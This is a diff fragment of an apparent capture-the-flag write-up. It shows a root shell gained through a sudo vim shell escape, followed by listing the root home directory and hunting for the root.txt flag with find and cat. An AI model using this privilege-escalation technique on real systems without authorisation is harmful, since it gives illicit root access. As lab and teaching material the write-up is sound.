@@ -167,4 +167,22 @@ $ sudo vim -c ':!/bin/sh'
 :!/bin/sh
 id
 uid=0(root) gid=0(root) groups=0(root)
+ls -la
+total 44
+drwx------  3 root root  4096 Aug 17 23:46 .
+drwxr-xr-x 18 root root  4096 Mar 11  2023 ..
+lrwxrwxrwx  1 root root     9 Feb 23  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root   571 Apr 10  2021 .bashrc
+drwxr-xr-x  3 root root  4096 Feb 21  2023 .local
+-rw-r--r--  1 root root   161 Jul  9  2019 .profile
+-rw-------  1 root root 12288 Aug 17 23:44 .root.txt.swp
+-rw-------  1 root root  1145 Aug 17 23:46 .viminfo
+-r-xr-xr-x  1 root root   509 Mar 11  2023 interfaces.sh
+-r--------  1 root root    24 Mar 11  2023 root.txt
+cat root.txt
+Not yet! Find root.txt.
+find / -name root.txt 2>/dev/null
+/var/log/apache2/root.txt
+/root/root.txt
+cat /var/log/apache2/root.txt
 ```
